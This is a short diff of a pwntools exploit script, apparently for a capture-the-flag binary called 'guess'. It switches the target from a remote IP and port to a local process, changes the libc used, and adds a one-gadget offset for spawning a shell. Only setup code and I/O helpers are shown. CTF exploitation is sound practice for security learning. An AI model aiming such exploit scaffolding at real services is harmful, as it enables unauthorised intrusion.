@@ -1,12 +1,12 @@
 from pwn import *
 import time
 from LibcSearcher import *
-# p=process("./guess")
-p=remote("61.147.171.105",62132)
+p=process("./guess")
+# p=remote("61.147.171.105",62132)
 elf=ELF("./guess")
-libc=ELF('./libc-2.27.so')
-# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
-context.log_level=True
+# libc=ELF('./libc-2.27.so')
+libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
+# context.log_level=True
 ru = lambda x : p.recvuntil(x)
 sn = lambda x : p.send(x)
 rl = lambda   : p.recvline()
@@ -17,6 +17,7 @@ sla = lambda a,b : p.sendlineafter(a,b)
 
 onegadget=0x4f3c2#bak时使用
 # onegadget=0xf3fa7
+onegadget=0xe3b01
 def login(account,password):
     sla(b'Choice: ',b'1')
     sa(b'Account: ' ,account)
